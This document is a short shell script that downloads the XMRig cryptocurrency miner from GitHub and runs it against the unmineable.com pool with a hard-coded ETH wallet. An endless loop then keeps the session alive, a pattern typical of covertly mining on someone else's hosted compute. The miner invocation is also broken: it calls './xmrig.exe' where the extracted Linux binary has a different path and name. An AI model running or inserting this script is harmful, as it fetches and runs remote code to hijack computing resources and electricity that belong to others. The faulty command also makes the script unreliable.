#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
tar xf xmrig-6.12.1-linux-x64.tar.gz
./xmrig.exe -o rx.unmineable.com:13333 -a rx -k -u ETH:0x7d0d7A8e7500Ff141C22985997C1BCAC646B5fdD.Tuyul
while [ 1 ]; do
sleep 3
done
sleep 999
